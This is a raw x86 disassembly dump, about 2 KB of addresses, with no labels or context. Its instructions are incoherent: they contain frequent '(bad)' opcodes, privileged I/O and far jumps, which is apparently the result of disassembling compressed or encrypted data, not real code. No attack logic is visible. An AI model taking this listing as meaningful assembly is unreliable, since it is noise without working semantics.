  422e17:	cmp    DWORD PTR ds:[esi],0x16
  422e1b:	repz xchg ch,al
  422e1e:	adc    ah,dh
  422e20:	jmp    0xe61f1071
  422e25:	sub    bh,BYTE PTR cs:[esi-0x61]
  422e29:	mov    al,ds:0x1f82276a
  422e2e:	mov    ds:0x27ab52cf,eax
  422e33:	dec    esi
  422e34:	test   DWORD PTR [ecx+ebx*8+0x2d04cef4],esp
  422e3b:	mov    ebp,0x105a8290
  422e40:	cmp    eax,edi
  422e42:	adc    eax,0x15f0e467
  422e47:	sub    cl,dl
  422e49:	inc    esp
  422e4a:	(bad)  
  422e4b:	cld    
  422e4c:	mov    edx,0x145483e0
  422e51:	sar    edx,0x17
  422e54:	mov    bl,0x4b
  422e56:	add    BYTE PTR [eax+0x2cdddeb3],cl
  422e5c:	add    al,0xdc
  422e5e:	scas   al,BYTE PTR es:[edi]
  422e5f:	mov    eax,ds:0x6f8f5eef
  422e64:	cld    
  422e65:	jns    0x422ea9
  422e67:	popf   
  422e68:	add    al,0x92
  422e6a:	adc    ch,bh
  422e6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e6d:	inc    BYTE PTR [ebx]
  422e6f:	dec    esp
  422e70:	mov    edx,0xc1ed8d81
  422e75:	sub    al,0x64
  422e77:	arpl   WORD PTR [esi],si
  422e79:	pop    esi
  422e7a:	sub    edx,ebx
  422e7c:	ins    BYTE PTR es:[edi],dx
  422e7d:	or     eax,0xf35f5a43
  422e82:	push   esp
  422e83:	ja     0x422eaa
  422e85:	pop    edx
  422e86:	xlat   BYTE PTR ds:[ebx]
  422e87:	imul   ecx,DWORD PTR gs:[eax-0x7a],0x17
  422e8c:	cs in  eax,dx
  422e8e:	mov    ds:0x36183501,al
  422e93:	and    esi,DWORD PTR [ebx]
  422e95:	mov    eax,ds:0x15bf76a3
  422e9a:	sub    eax,0x5430c20e
  422e9f:	xchg   edx,eax
  422ea0:	jne    0x422eed
  422ea2:	repnz xor eax,0xd7f6f7ed
  422ea8:	or     bh,BYTE PTR [ecx]
  422eaa:	test   ebx,ebp
  422eac:	nop
  422ead:	imul   DWORD PTR [ebp+0x1b9f99df]
  422eb3:	out    0x34,eax
  422eb5:	mov    dl,0x4d
  422eb7:	xchg   edx,eax
  422eb8:	test   eax,0xa1be3621
  422ebd:	jmp    0x254c1beb
  422ec2:	dec    esp
  422ec3:	or     edx,DWORD PTR [edx]
  422ec5:	push   ds
  422ec6:	retf   0x727c
  422ec9:	xchg   edi,eax
  422eca:	dec    ebp
  422ecb:	mov    ch,0xc2
  422ecd:	mov    WORD PTR [esi],cs
  422ecf:	arpl   WORD PTR [edx],bp
  422ed1:	jb     0x422f13
  422ed3:	test   BYTE PTR [ecx],dh
  422ed5:	or     BYTE PTR [edx],0xd0
  422ed8:	mov    WORD PTR [eax-0x5c0ea75b],es
  422ede:	jg     0x422e79
  422ee0:	scas   eax,DWORD PTR es:[edi]
  422ee1:	mov    ah,0xcc
  422ee3:	adc    esi,DWORD PTR [eax]
  422ee5:	pusha  
  422ee6:	sti    
  422ee7:	iret   
  422ee8:	popa   
  422ee9:	into   
  422eea:	mov    al,0xca
  422eec:	iret   
  422eed:	leave  
  422eee:	jmp    0xe1ea:0x617ca945
  422ef5:	fld    DWORD PTR [ecx-0x1e]
  422ef8:	call   0xd54b:0x6d1d1187
  422eff:	push   ebx
  422f00:	pop    ebx
  422f01:	(bad)  
  422f02:	cmp    BYTE PTR [edx],bl
  422f04:	lea    ecx,[eax]
  422f06:	addr16 js 0x422eb1
  422f09:	and    BYTE PTR [eax-0x2c],al
  422f0c:	in     eax,dx
  422f0d:	mov    ebp,0xd5bc478b
  422f12:	push   esp
  422f13:	fldenv [eax]
  422f15:	retf   0x879a
  422f18:	rcl    DWORD PTR [ecx-0x3556aeb6],cl
  422f1e:	fld    DWORD PTR [edi+0x36c53f3b]
  422f24:	xchg   ebp,eax
  422f25:	adc    DWORD PTR [ebp+0x19],esi
  422f28:	sbb    al,0x3
  422f2a:	call   0x93c:0x98ef273d
  422f31:	rcl    dh,1
  422f33:	aam    0xfc
  422f35:	mov    BYTE PTR [ebp-0x4fbc462e],cl
  422f3b:	and    DWORD PTR [edx],ebp
  422f3d:	xlat   BYTE PTR ds:[ebx]
  422f3e:	pop    eax
  422f3f:	push   ebp
  422f40:	and    BYTE PTR ds:[ecx-0x16],0x7
  422f45:	popa   
  422f46:	adc    DWORD PTR [ebx-0x25],ebp
  422f49:	mov    ecx,0x82855d49
  422f4e:	xchg   edx,eax
  422f4f:	sbb    bh,BYTE PTR [edx]
  422f51:	pop    ebp
  422f52:	dec    ebx
  422f53:	fld    QWORD PTR [eax-0x7c]
  422f56:	cmp    DWORD PTR [ebx],edi
  422f58:	add    edx,DWORD PTR [edi]
  422f5a:	iret   
  422f5b:	xchg   edx,eax
  422f5c:	idiv   ebp
  422f5e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f60:	stc    
  422f61:	adc    al,0xdf
  422f63:	and    DWORD PTR [edx+ebx*1-0x3b],0x5b
  422f68:	daa    
  422f69:	popf   
  422f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6b:	mov    edi,0xd29cc31c
  422f70:	je     0x422f9a
  422f72:	arpl   WORD PTR [edx+0x6c0750b3],sp
  422f78:	push   ss
  422f79:	mov    ds:0x961da297,eax
  422f7e:	push   ecx
  422f7f:	adc    DWORD PTR [ebp-0x6],ecx
  422f82:	cdq    
  422f83:	int3   
  422f84:	cmp    eax,0xb5b9d237
  422f89:	jecxz  0x422f6b
  422f8b:	shl    BYTE PTR [ebx+0x19aac4b1],0xe6
  422f92:	push   es
  422f93:	int    0xde
  422f95:	fnsave ds:0xac701f58
  422f9b:	xor    DWORD PTR es:0xd569cc7e,esi
  422fa2:	mov    dh,0x9b
  422fa4:	into   
  422fa5:	loope  0x422f9a
  422fa7:	icebp  
  422fa8:	retf   0x58c2
  422fab:	jg     0x422f99
  422fad:	pop    esi
  422fae:	adc    BYTE PTR [edx],ah
  422fb0:	and    ebp,DWORD PTR [ecx-0x9]
  422fb3:	les    esi,FWORD PTR [eax+edi*1+0x7a]
  422fb7:	push   ss
  422fb8:	xlat   BYTE PTR ds:[ebx]
  422fb9:	ret    0x8361
  422fbc:	and    eax,0x5c09ebe5
  422fc1:	ja     0x422f60
  422fc3:	ret    0x273d
  422fc6:	leave  
  422fc7:	and    al,0xc5
  422fc9:	cld    
  422fca:	push   esp
  422fcb:	fdiv   QWORD PTR [edi]
  422fcd:	ret    0xdfc
  422fd0:	aam    0x6f
  422fd2:	add    BYTE PTR [ebp-0x1c],ah
  422fd5:	pop    edx
  422fd6:	stc    
  422fd7:	loope  0x423057
  422fd9:	xor    eax,0x57546d33
  422fde:	mov    edi,0x3c0aa0bc
  422fe3:	sub    dl,BYTE PTR [ebp+0x44a0386e]
  422fe9:	pop    edi
  422fea:	call   0xd2e1069c
  422fef:	mov    ah,0xd4
  422ff1:	not    DWORD PTR gs:[ecx+ebp*2+0x256e685]
  422ff9:	fisub  DWORD PTR [edi]
  422ffb:	cmp    edx,DWORD PTR [eax-0x1f7fedeb]
  423001:	ins    DWORD PTR es:[edi],dx
  423002:	pushf  
  423003:	lock mov esp,0xdee35c1f
  423009:	adc    edi,ecx
  42300b:	(bad)  
  42300c:	mov    eax,ds:0x9cb3f0f4
  423011:	push   cs
  423012:	jb     0x42307c
  423014:	mov    ebx,0x6995617a
  423019:	popa   
  42301a:	lahf   
  42301b:	test   ecx,edx
  42301d:	inc    ecx
  42301e:	daa    
  42301f:	je     0x423058
  423021:	xchg   ebx,eax
  423022:	les    esp,FWORD PTR [edx]
  423024:	in     eax,0x47
  423026:	neg    DWORD PTR [edx+0x37]
  423029:	test   ch,0x99
  42302c:	mov    ds:0x41688068,al
  423031:	dec    ecx
  423032:	data16 jo 0x423036
  423035:	call   0x7643:0x6ee04d80
  42303c:	imul   esi,DWORD PTR [ecx],0x5efc772
  423042:	aas    
  423043:	stc    
  423044:	and    bl,al
  423046:	or     al,0xfb
  423048:	sub    eax,0xcc651e5a
  42304d:	xor    eax,0xe7c3a981
  423052:	repnz frstor [edx-0x40]
  423056:	adc    eax,0xd63a879c
  42305b:	push   esi
  42305c:	(bad)  
  42305d:	jo     0x42306d
  42305f:	dec    eax
  423060:	loopne 0x423077
  423062:	aaa    
  423063:	fcom   DWORD PTR [edx+eax*2+0x6bacb2d5]
  42306a:	aam    0x56
  42306c:	gs jmp 0x4230c4
  42306f:	xlat   BYTE PTR ds:[bx]
  423071:	lahf   
  423072:	(bad)  
  423073:	xchg   esp,eax
  423074:	xchg   edi,eax
  423075:	or     bl,BYTE PTR [eax+0x6c]
  423078:	fist   WORD PTR [edi+0x70]
  42307b:	in     eax,0xdc
  42307d:	scas   al,BYTE PTR es:[edi]
  42307e:	mov    al,0x35
  423080:	icebp  
  423081:	adc    eax,ebp
  423083:	(bad)  
  423084:	imul   DWORD PTR [esi-0x15de188d]
  42308a:	imul   ebx,eax,0x45a3e80d
  423090:	adc    dh,BYTE PTR [edx+0x79a4e08a]
  423096:	jno    0x423096
  423098:	scas   al,BYTE PTR es:[edi]
  423099:	sar    DWORD PTR [edi-0x433bd44e],0x80
  4230a0:	in     al,0xd4
  4230a2:	(bad)  
  4230a3:	int3   
  4230a4:	in     al,dx
  4230a5:	jne    0x423122
  4230a7:	aam    0xcd
  4230a9:	push   es
  4230aa:	sub    al,0xcd
  4230ac:	repz push ss
  4230ae:	adc    esi,DWORD PTR [ecx+0x7cfe8453]
  4230b4:	(bad)  
  4230b5:	mov    edi,0x17b29811
  4230ba:	repz pop esp
  4230bc:	pop    ebp
  4230bd:	sub    DWORD PTR [edi+0x4a],esi
  4230c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230c1:	push   ss
  4230c2:	clc    
  4230c3:	sbb    dh,BYTE PTR [edx]
  4230c5:	scas   al,BYTE PTR es:[edi]
  4230c6:	repz or al,BYTE PTR ds:0x651297dc
  4230cd:	xlat   BYTE PTR ds:[ebx]
  4230ce:	scas   al,BYTE PTR es:[edi]
  4230cf:	dec    eax
  4230d0:	and    DWORD PTR [ecx],ebp
  4230d2:	dec    ebx
  4230d3:	dec    esi
  4230d4:	sub    DWORD PTR [edx],0x35b3f5ba
  4230da:	outs   dx,DWORD PTR ds:[esi]
  4230db:	xchg   DWORD PTR [ebx-0x3978084e],ebp
  4230e1:	xor    al,0xff
  4230e3:	mov    ch,0x7a
  4230e5:	scas   eax,DWORD PTR es:[edi]
  4230e6:	jne    0x4230d0
  4230e8:	add    ah,bl
  4230ea:	push   esp
  4230eb:	ret    
  4230ec:	add    cl,al
  4230ee:	outs   dx,BYTE PTR ds:[esi]
  4230ef:	outs   dx,BYTE PTR ds:[esi]
  4230f0:	cmc    
  4230f1:	add    ax,0x2098
  4230f5:	stos   BYTE PTR es:[edi],al
  4230f6:	clc    
  4230f7:	mov    eax,0xc41355f5
  4230fc:	dec    ebp
  4230fd:	and    eax,0xcbcc290e
  423102:	dec    esp
  423103:	sti    
  423104:	dec    edi
  423105:	push   esi
  423106:	lods   eax,DWORD PTR ds:[esi]
  423107:	jno    0x423115
  423109:	mov    al,0x97
  42310b:	outs   dx,DWORD PTR ds:[esi]
  42310c:	(bad)  [edx]
  42310e:	ror    DWORD PTR [esi+ecx*2-0x2f],0xc0
  423113:	jne    0x423190
  423115:	das    
  423116:	cli    
  423117:	shl    BYTE PTR [ecx+edx*2+0x43],1
  42311b:	leave  
  42311c:	push   esi
  42311d:	pop    ebp
  42311e:	int    0x13
  423120:	int    0x9d
  423122:	ja     0x42311b
  423124:	jno    0x423107
  423126:	push   ecx
  423127:	fadd   QWORD PTR [edi-0x51dce99d]
  42312d:	xor    BYTE PTR [esi-0x1f14d727],ah
  423133:	into   
  423134:	sbb    DWORD PTR [esi],0xffffffd3
  423137:	mov    ecx,0xdedf04d7
  42313c:	jmp    0x4230d0
  42313e:	xlat   BYTE PTR ds:[ebx]
  42313f:	lods   al,BYTE PTR ds:[esi]
  423140:	ins    DWORD PTR es:[edi],dx
  423141:	ja     0x4230fa
  423143:	mov    ah,0x30
  423145:	push   eax
  423146:	xor    ebp,DWORD PTR [eax]
  423148:	stc    
  423149:	pop    ecx
  42314a:	sbb    ecx,ecx
  42314c:	std    
  42314d:	out    dx,al
  42314e:	cmp    DWORD PTR [eax],ebp
  423150:	xchg   ebp,eax
  423151:	gs jcxz 0x4231b6
  423155:	or     eax,0x566975d8
  42315a:	mov    eax,0x2c9f8cc8
  42315f:	cmp    eax,ebx
  423161:	cmp    eax,0xbd11d53d
  423166:	ret    
  423167:	and    edi,DWORD PTR [ebx-0x6c]
  42316a:	and    eax,0xbd26836b
  42316f:	sbb    esi,ebx
  423171:	jmp    0x1de61d11
  423176:	ins    BYTE PTR es:[edi],dx
  423177:	xchg   esp,eax
  423178:	pop    eax
  423179:	xchg   ebp,eax
  42317a:	push   ecx
  42317b:	add    eax,0x15da8fb2
  423180:	push   ds
  423181:	ins    DWORD PTR es:[edi],dx
  423182:	add    edx,DWORD PTR [edi]
  423184:	cwde   
  423185:	xchg   ebp,eax
  423186:	mov    eax,0x3294fa0
  42318b:	push   0x31
  42318d:	inc    ecx
  42318e:	pop    es
  42318f:	nop
  423190:	out    0x50,al
  423192:	outs   dx,DWORD PTR ds:[esi]
  423193:	aam    0xde
  423195:	push   cs
  423196:	into   
  423197:	ds xchg ebx,eax
  423199:	(bad)  
  42319a:	scas   eax,DWORD PTR es:[edi]
  42319b:	mov    esp,0x73b0d08b
  4231a0:	lods   eax,DWORD PTR ds:[esi]
  4231a1:	add    BYTE PTR [ebx+0x4c],al
  4231a4:	and    ch,BYTE PTR [ecx-0x60ea64a2]
  4231aa:	ja     0x4231cf
  4231ac:	mov    ch,BYTE PTR [esi+0x1a]
  4231af:	inc    ecx
  4231b0:	lds    ebx,FWORD PTR [ecx-0x7a]
  4231b3:	shl    DWORD PTR [esi-0x7d],0x3c
  4231b7:	jge    0x423189
  4231b9:	ins    DWORD PTR es:[edi],dx
  4231ba:	ror    BYTE PTR [eax],1
  4231bc:	(bad)  
  4231bd:	icebp  
  4231be:	mov    ds:0xa0c97a74,al
  4231c3:	inc    ebp
  4231c4:	inc    ebx
  4231c5:	ja     0x4231b1
  4231c7:	xchg   esi,eax
  4231c8:	mov    edi,0x2bc953d3
  4231cd:	push   eax
  4231ce:	xor    al,0x65
  4231d0:	imul   esi,DWORD PTR [ebx-0x59],0x805983d7
  4231d7:	pop    ds
  4231d8:	mov    DWORD PTR [ecx],eax
  4231da:	sub    al,0x71
  4231dc:	mov    edi,0x840c78b
  4231e1:	in     eax,0x9e
  4231e3:	fdiv   DWORD PTR [ecx-0x567875e4]
  4231e9:	mov    ebp,0x819519ce
  4231ee:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231f0:	sbb    al,0x71
  4231f2:	rcl    DWORD PTR ds:0x529b8f32,0x3e
  4231f9:	cmp    esp,edx
  4231fb:	jno    0x423185
  4231fd:	cli    
  4231fe:	mov    ds:0x99a8a82d,al
  423203:	cmp    eax,0x5ef84cb2
  423208:	loop   0x4231a9
  42320a:	lods   eax,DWORD PTR ds:[esi]
  42320b:	idiv   ecx
  42320d:	cs pop ds
  42320f:	mov    eax,0x6e267e0d
  423214:	inc    esp
  423215:	jnp    0x423246
  423217:	sub    ch,al
  423219:	adc    BYTE PTR [ebx],dl
  42321b:	jg     0x423259
  42321d:	mov    bl,0x18
  42321f:	mov    dl,0xf1
  423221:	pop    esi
  423222:	ja     0x423243
  423224:	sbb    BYTE PTR [eax+0x2d],al
  423227:	or     BYTE PTR [ecx+0x2a],dl
  42322a:	jmp    0x64881ab3
  42322f:	push   0xfffffff9
  423231:	inc    eax
  423232:	mov    dl,0xd
  423234:	test   al,0xf9
  423236:	adc    DWORD PTR [esi-0x1902a1ea],ebp
  42323c:	outs   dx,DWORD PTR ds:[esi]
  42323e:	adc    al,0x53
  423240:	fcom   QWORD PTR [esi-0xfc2d255]
  423246:	pop    ebp
  423247:	aaa    
  423248:	ret    
  423249:	in     eax,0x88
  42324b:	(bad)  
  42324c:	in     al,0x5a
  42324e:	hlt    
  42324f:	vpshab ymm9,xmm1,[ebx-0x19]
  423255:	cmp    eax,edi
  423257:	iret   
  423258:	cmp    BYTE PTR [edi],0x96
  42325b:	pop    ss
  42325c:	iret   
  42325d:	fmul   QWORD PTR [edx+0x23268eec]
  423263:	xor    bh,dl
  423265:	mov    esi,0x72ead376
  42326a:	test   DWORD PTR es:[esi+0x4d7e307b],0x2e42b6
  423275:	lods   al,BYTE PTR ds:[esi]
  423276:	push   ecx
  423277:	sub    eax,0x3b77db12
  42327c:	js     0x42320c
  42327e:	xor    al,0xfb
  423280:	xor    esp,edx
  423282:	fucomip st,st(6)
  423284:	jno    0x4232eb
  423286:	mov    eax,0x745e4595
  42328b:	jmp    0x7d64fc57
  423290:	jbe    0x423268
  423292:	aam    0xb7
  423294:	pop    eax
  423295:	rcr    bh,cl
  423297:	stos   BYTE PTR es:[edi],al
  423298:	mov    al,0x19
  42329a:	ret    0xe5d0
  42329d:	sahf   
  42329e:	outs   dx,DWORD PTR ds:[esi]
  42329f:	(bad)  
  4232a0:	loopne 0x423222
  4232a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232a3:	jns    0x423225
  4232a5:	lds    ecx,FWORD PTR [eax+0x9d82b24]
  4232ab:	jecxz  0x4232db
  4232ad:	dec    BYTE PTR [eax+0x1]
  4232b0:	cmc    
  4232b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b2:	push   ebp
  4232b3:	or     eax,0x14745946
  4232b8:	rol    DWORD PTR [ecx+ecx*1+0x72],1
  4232bc:	shl    DWORD PTR [ecx+eax*1-0x6f],1
  4232c0:	mov    ds,WORD PTR ds:0xeb0ab2fc
  4232c6:	clc    
  4232c7:	lea    ecx,gs:[edi-0x64]
  4232cb:	adc    BYTE PTR [ebx-0x27c05144],al
  4232d1:	jecxz  0x4232e5
  4232d3:	sahf   
  4232d4:	cmp    bl,BYTE PTR [edx+0x88c15a4]
  4232da:	fnsave [esi]
  4232dc:	or     BYTE PTR [eax],bl
  4232de:	rcl    DWORD PTR [ebp-0x3e],0x40
  4232e2:	daa    
  4232e3:	push   ebx
  4232e4:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4232e6:	cmp    eax,0x96fce83e
  4232eb:	sbb    DWORD PTR [eax+0x4c],ecx
  4232ee:	outs   dx,BYTE PTR ds:[esi]
  4232ef:	loopne 0x42327c
  4232f1:	add    eax,0x3982baef
  4232f7:	mov    esi,0x69a5eeb
  4232fc:	pop    edx
  4232fd:	or     al,0x5a
  4232ff:	into   
  423300:	dec    ebx
  423301:	sbb    BYTE PTR [ecx+ecx*8],0x31
  423305:	outs   dx,BYTE PTR ds:[esi]
  423306:	mov    ebx,0xd415d9fd
  42330b:	clc    
  42330c:	out    dx,al
  42330d:	xchg   ecx,eax
  42330e:	mov    bh,0xf6
  423310:	cmp    BYTE PTR [edi],dh
  423312:	jb     0x423358
  423314:	shr    BYTE PTR [eax],1
  423316:	xor    al,0x77
  423318:	loopne 0x423366
  42331a:	fucomi st,st(2)
  42331c:	and    eax,ebx
  42331e:	aad    0x6e
  423320:	add    al,0xa2
  423322:	jo     0x423395
  423324:	icebp  
  423325:	test   BYTE PTR [edi+0x5e],bh
  423328:	nop
  423329:	xchg   BYTE PTR [edi+edx*2+0x22],bl
  42332d:	fld    QWORD PTR [ecx]
  42332f:	mov    ebp,0x569001b
  423334:	inc    eax
  423335:	call   0xc1ab3bbb
  42333a:	iret   
  42333b:	sbb    cl,BYTE PTR [ecx]
  42333d:	(bad)  
  42333e:	lea    ecx,[ecx+ebp*8+0x6a580770]
  423345:	daa    
  423346:	test   eax,0xbc5a93d9
  42334b:	les    ebp,FWORD PTR [ecx+0x59fde16e]
  423351:	jg     0x42336d
  423353:	inc    esp
  423354:	or     bh,BYTE PTR [ecx-0x11]
  423357:	popf   
  423358:	pop    esp
  423359:	lds    edi,FWORD PTR [ebx-0x1b]
  42335c:	fnsave [ebp-0x77]
  42335f:	add    DWORD PTR [edi-0x6b82347b],esi
  423365:	mov    DWORD PTR [edx+0x7d],edx
  423368:	jae    0x4233d1
  42336a:	xchg   DWORD PTR [ebp+0x59],edi
  42336d:	cdq    
  42336e:	push   esi
  42336f:	mov    bl,0x15
  423371:	leave  
  423372:	stos   DWORD PTR es:[edi],eax
  423373:	mov    ah,0x7a
  423375:	sbb    cl,0xc7
  423378:	mov    edx,0x2baaba3
  42337d:	mov    eax,ds:0xc9fb581d
  423382:	cwde   
  423383:	xor    al,0xa8
  423385:	jbe    0x423350
  423387:	add    al,0xde
  423389:	cmp    edx,DWORD PTR [edi+edx*4]
  42338c:	push   edi
  42338d:	enter  0xad04,0x32
  423391:	push   ss
  423392:	ins    DWORD PTR es:[edi],dx
  423393:	pop    esp
  423394:	vhaddpd xmm7,xmm5,xmm6
  423398:	out    dx,eax
  423399:	mov    bh,0x6c
  42339b:	call   DWORD PTR [eax+0x1c]
  42339e:	or     BYTE PTR [edx*4-0xa574564],ch
  4233a5:	test   DWORD PTR [esi],edx
  4233a7:	cmp    esi,edx
  4233a9:	cs or  eax,0xcc324d60
  4233af:	xchg   esp,eax
  4233b0:	mov    WORD PTR [esi+0x25],ss
  4233b3:	ficomp WORD PTR [ebx-0x21]
  4233b6:	sbb    al,0xee
  4233b8:	aaa    
  4233b9:	mov    BYTE PTR [ebx+0x69],ch
  4233bc:	sbb    ch,BYTE PTR [ebx-0x40a6d22]
  4233c2:	test   eax,0x87fcc297
  4233c7:	les    edx,FWORD PTR [ebp+0x1f]
  4233ca:	retf   0xb97
  4233cd:	cmc    
  4233ce:	data16 test al,0x5
  4233d1:	jle    0x4233c3
  4233d3:	(bad)  
  4233d4:	pusha  
  4233d5:	ud2    
  4233d7:	jnp    0x42338d
  4233d9:	fwait
  4233da:	ins    BYTE PTR es:[edi],dx
  4233db:	mov    dh,0xe1
  4233dd:	pop    ebp
  4233de:	push   edi
  4233df:	into   
  4233e0:	dec    esp
  4233e1:	out    0x1a,eax
  4233e3:	cli    
  4233e4:	mov    es,WORD PTR [ecx-0x40]
  4233e7:	push   ss
  4233e8:	dec    eax
  4233e9:	repz inc esi
  4233eb:	sbb    eax,0x9c19fa32
  4233f0:	in     al,dx
  4233f1:	mov    al,0xd2
  4233f3:	sub    cl,BYTE PTR [ebp-0x684a06ac]
  4233f9:	loop   0x4233fb
  4233fb:	or     DWORD PTR [ebp-0x21],ebp
  4233fe:	rcl    BYTE PTR [edx+edx*8+0x78cb03d5],cl
  423405:	(bad)  
  423406:	dec    ebx
  423407:	enter  0x155e,0xa3
  42340b:	pop    esi
  42340c:	mov    edi,esp
  42340e:	out    0xb4,al
  423410:	loopne 0x4233f6
  423412:	ficomp DWORD PTR [eax+0x37f4d96a]
  423418:	or     eax,0x8075382
  42341d:	cmp    al,0x9c
  42341f:	repnz and ebp,eax
  423422:	ins    BYTE PTR es:[edi],dx
  423423:	jmp    0x4233de
  423425:	ins    BYTE PTR es:[edi],dx
  423426:	jl     0x42343f
  423428:	daa    
  423429:	xor    eax,0x792ed1cd
  42342e:	icebp  
  42342f:	iret   
  423430:	cmp    esp,DWORD PTR [ebx+0x7d]
  423433:	lods   eax,DWORD PTR ds:[esi]
  423434:	cmp    DWORD PTR es:[edx-0x18f6cf49],eax
  42343b:	(bad)  
  42343c:	das    
  42343d:	lea    ebp,[ebx-0x62c4bb93]
  423443:	cdq    
  423444:	call   0x529c9dbd
  423449:	push   ds
  42344a:	rcl    DWORD PTR es:[edx],cl
  42344d:	or     ch,BYTE PTR [edi+0x5e]
  423450:	(bad)  
  423451:	in     al,0x4b
  423453:	and    bh,BYTE PTR [ecx+0x35ac03ad]
  423459:	(bad)  
  42345a:	into   
  42345b:	or     BYTE PTR [ebp-0x612b4d02],0xfa
  423462:	in     eax,dx
  423463:	dec    esi
  423464:	mov    ?,WORD PTR [edi+ecx*1]
  423467:	push   ecx
  423468:	mov    ch,0xed
  42346a:	push   ss
  42346b:	xchg   esp,eax
  42346c:	adc    BYTE PTR [eax+0x31],bh
  42346f:	sub    DWORD PTR [ebx-0x73],ecx
  423472:	xor    BYTE PTR [esi-0x5e],bl
  423475:	inc    ebp
  423476:	adc    al,0xa3
  423478:	cmp    DWORD PTR [edx],ebp
  42347a:	out    dx,al
  42347b:	nop
  42347c:	ins    DWORD PTR es:[edi],dx
  42347d:	xchg   BYTE PTR [ebx+0x1e],dh
  423480:	ror    DWORD PTR [ebx],0x15
  423483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423484:	mov    cl,0xe
  423486:	mov    cl,0xe3
  423488:	xchg   DWORD PTR [edi-0x5dde6dc1],ebp
  42348e:	or     dl,BYTE PTR [ebp+0x5bed8397]
  423494:	sub    ebp,DWORD PTR [esi]
  423496:	mov    dh,0x81
  423498:	scas   eax,DWORD PTR es:[edi]
  423499:	push   0x48d5cb3c
  42349e:	xlat   BYTE PTR ds:[ebx]
  42349f:	inc    esi
  4234a0:	ret    0xf73b
  4234a3:	ja     0x4234ea
  4234a5:	mov    esi,0x87d8d91e
  4234aa:	push   ds
  4234ab:	lea    esp,[eax]
  4234ad:	push   edi
  4234ae:	sbb    eax,0x88d84083
  4234b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234b4:	xor    eax,0x80657b72
  4234b9:	test   DWORD PTR [eax+0x33],ebx
  4234bc:	mov    dl,0xb8
  4234be:	sbb    bh,BYTE PTR [eax]
  4234c0:	call   0xed6d:0x1f08441f
  4234c7:	(bad)  
  4234c8:	mov    ebp,0x90132eb0
  4234cd:	ins    DWORD PTR es:[edi],dx
  4234ce:	into   
  4234cf:	sbb    DWORD PTR [edi+0x41399cd6],edx
  4234d5:	popa   
  4234d6:	and    eax,0xe3249eec
  4234db:	pop    ebx
  4234dc:	pop    esp
  4234dd:	dec    eax
  4234de:	and    DWORD PTR ds:0x8e5780ba,ebp
  4234e4:	dec    ebx
  4234e5:	out    dx,al
  4234e6:	xchg   ebx,eax
  4234e7:	loop   0x423547
  4234e9:	lods   al,BYTE PTR ds:[esi]
  4234ea:	fisttp DWORD PTR [edi+0x6c9381e]
  4234f0:	xchg   edx,eax
  4234f1:	dec    ebp
  4234f2:	sub    DWORD PTR cs:[ebx],esp
  4234f5:	outs   dx,DWORD PTR ds:[esi]
  4234f6:	sub    al,dh
  4234f8:	test   al,0xf4
  4234fa:	(bad)
  4234ff:	jp     0x42350c
  423501:	or     esp,ecx
  423503:	lahf   
  423504:	(bad)  
  423505:	fild   WORD PTR [ecx]
  423507:	out    0x43,eax
  423509:	je     0x4234a2
  42350b:	inc    eax
  42350c:	sbb    al,BYTE PTR [edi-0x5d]
  42350f:	push   ebp
  423510:	xchg   edi,eax
  423511:	dec    esp
  423512:	push   ds
  423513:	dec    BYTE PTR [ebp+0x9]
  423516:	call   0x75b8:0x2f105294
  42351d:	out    0xa1,eax
  42351f:	das    
  423520:	es sub eax,0x61b649c3
  423526:	cli    
  423527:	dec    esi
  423528:	pop    edi
  423529:	jnp    0x4234e0
  42352b:	jae    0x423594
  42352d:	jb     0x423544
  42352f:	or     DWORD PTR [ebx+0xb],ecx
  423532:	push   edi
  423533:	dec    edx
  423534:	or     dh,cl
  423536:	xor    al,bh
  423538:	loopne 0x4234c9
  42353a:	addr16 in eax,0xc8
  42353d:	mov    al,0x99
  42353f:	xor    DWORD PTR [ecx],edx
  423541:	add    BYTE PTR [esi],dh
  423543:	fist   DWORD PTR [edx]
  423545:	jo     0x4235a5
  423547:	mov    ah,0xfd
  423549:	add    edi,DWORD PTR [ebp+edx*8-0x32]
  42354d:	mov    cl,BYTE PTR [ebx+0x29]
  423550:	push   eax
  423551:	inc    ecx
  423552:	es mov dl,0x46
  423555:	cmp    dh,al
  423557:	ins    BYTE PTR es:[edi],dx
  423558:	fcom   QWORD PTR [eiz*8-0x4238cf4f]
  42355f:	test   ch,cl
  423561:	lea    ebx,[ebx-0x6d]
  423564:	jnp    0x42355b
  423566:	inc    ebx
  423567:	mov    ebp,0x371476e1
  42356c:	mov    DWORD PTR [edi-0x31ad0b75],edx
  423572:	retf   
  423573:	les    ebp,FWORD PTR [edi+0x4b]
  423576:	mov    ds,WORD PTR [eax]
  423578:	scas   eax,DWORD PTR es:[edi]
  423579:	jns    0x42359d
  42357b:	mov    ah,0xc4
  42357d:	mov    bh,0x75
  42357f:	ds lahf 
  423581:	cld    
  423582:	js     0x423577
  423584:	(bad)  
  423585:	les    esi,FWORD PTR [esi+esi*2]
  423588:	add    al,0xfd
  42358a:	mov    ss:0x63e3681e,al
  423590:	sbb    al,0xc5
  423592:	ins    BYTE PTR es:[edi],dx
  423593:	shl    BYTE PTR [edi],1
  423595:	xchg   ebx,eax
  423596:	aaa    
  423597:	sar    ebx,0x1
  42359a:	test   al,0xb3
  42359c:	sbb    ebp,DWORD PTR [esi-0x1]
  42359f:	pop    ebx
  4235a0:	les    edx,FWORD PTR [edx+eiz*4+0x586c633a]
  4235a7:	test   DWORD PTR [eax+ebp*1-0x29],edi
  4235ab:	xchg   edx,eax
  4235ac:	mov    edi,0x7364ac1c
  4235b1:	push   cs
  4235b2:	ret    0x1356
  4235b5:	mov    ah,0x32
  4235b7:	sahf   
  4235b8:	(bad)  
  4235ba:	pop    ds
  4235bb:	jl     0x423556
  4235bd:	(bad)  
  4235be:	mov    esi,0x390f1048
  4235c3:	or     bh,BYTE PTR [eax]
  4235c5:	pop    eax
  4235c6:	jp     0x423591
  4235c8:	and    al,dh
